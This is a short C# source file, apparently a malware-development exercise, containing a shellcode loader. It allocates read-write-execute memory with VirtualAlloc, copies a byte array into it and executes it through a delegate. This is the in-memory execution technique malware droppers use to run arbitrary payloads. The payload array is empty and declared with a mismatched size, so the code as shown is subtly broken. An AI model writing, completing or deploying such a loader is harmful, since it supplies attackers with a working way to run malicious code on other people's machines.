using System;
using System.Runtime.InteropServices;

namespace MaldevEx1_shell_Loader_without_thread
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] sc = new byte[362] {};

            IntPtr funcAddr = VirtualAlloc(
                IntPtr.Zero,
                (ulong)sc.Length,
                (uint)(StateEnum.MEM_COMMIT | StateEnum.MEM_RESERVE),
                (uint)Protection.PAGE_EXECUTE_READWRITE
            );

            if (funcAddr == IntPtr.Zero)
                return;

            Marshal.Copy(sc, 0, funcAddr, sc.Length);

            ShellcodeRun f = Marshal.GetDelegateForFunctionPointer<ShellcodeRun>(funcAddr);
            f();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void ShellcodeRun();

        [Flags]
        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection : uint
        {
            PAGE_EXECUTE_READWRITE = 0x40,
        }
    }
}
